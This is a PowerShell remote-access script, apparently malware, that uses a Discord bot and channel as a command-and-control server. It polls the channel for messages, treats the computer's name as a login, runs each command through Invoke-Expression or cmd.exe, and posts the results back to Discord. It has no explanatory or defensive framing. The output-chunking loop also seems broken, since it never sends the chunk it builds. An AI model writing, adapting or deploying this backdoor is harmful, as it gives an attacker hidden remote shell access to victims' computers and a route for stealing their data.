$token = "$tk"
$chan  = "$ch"
$response = ""
$previouscmd = ""
$authenticated = 0

function PullMsg {
    try {
        $wc = [System.Net.WebClient]::new()
        $wc.Headers.Add('Authorization', "Bot $token")
        $json = $wc.DownloadString("https://discord.com/api/v9/channels/$chan/messages?limit=5")
        $msg = ($json | ConvertFrom-Json | Where-Object {!$_.author.bot} | Select-Object -First 1).content
        if ($msg) { $script:response = $msg.Trim() }
    } catch {
        Write-Warning "Ошибка получения сообщений: $_"
    }
}

function sendMsg {
    param([string]$Message)
    if (!$Message) { return }
    $Message = $Message -replace '`', "'"
    $uri = "https://discord.com/api/v9/channels/$chan/messages"
    $payload = @{
        "content" = $Message
        "username" = "$env:COMPUTERNAME"
    }
    $jsonBody = $payload | ConvertTo-Json -Compress
    $maxRetries = 3
    $retryCount = 0

    while ($retryCount -lt $maxRetries) {
        try {
            Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "application/json" -Body $jsonBody -TimeoutSec 10 | Out-Null
            Write-Host "Message sent to Discord"
            break
        } catch {
            if ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 429) {
                Write-Warning "Rate limited, retrying in 3 seconds..."
                Start-Sleep -Seconds 3
                $retryCount++
            }
            elseif ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 403) {
                Write-Warning "Forbidden error (403), likely missing permissions."
                break
            }
            else {
                Write-Warning "Failed to send message: $_"
                break
            }
        }
    }
}

Function Authenticate {
    if ($response -like "$env:COMPUTERNAME") {
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
        sendMsg "``PS | $($PWD.Path)>``"
    } else {
        $script:authenticated = 0
        $script:previouscmd = $response
    }
}

# ================== MAIN LOOP ==================
PullMsg
$previouscmd = $response
sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Session Waiting..`` :hourglass_flowing_sand:"

while ($true) {
    PullMsg
    if ($response -and $response -ne $previouscmd) {
        $previouscmd = $response
        $dir = $PWD.Path

        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                sendMsg ":octagonal_sign: Session Closed."
                break
            }
            if ($response -eq "Pause") {
                $authenticated = 0
                sendMsg ":pause_button: Session Paused."
                continue
            }

            $output = ""
            try {
                # Сначала пытаемся выполнить как PowerShell команду
                $output = Invoke-Expression $response 2>&1 | Out-String
            } catch {
                $output = "$_"
            }

            # Если PowerShell вывел пусто - пробуем через cmd.exe (для всех внешних команд)
            if ([string]::IsNullOrWhiteSpace($output)) {
                try {
                    $output = (cmd.exe /c $response 2>&1 | Out-String)
                } catch {
                    $output = "$_"
                }
            }

            $output = $output.Trim()
            if ($output) {
                $maxBatchSize = 1900
                $total = $output.Length
                for ($i=0; $i -lt $total; $i += $maxBatchSize) {
                    $chunk = $output.Substring($i, [Math]::Min($maxBatchSize, $total - $i))
                    sendMsg "``````"
                    Start-Sleep -Milliseconds 1000
                }
            } else {
                sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
            }
            sendMsg "``PS | $dir>``"
        } else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}
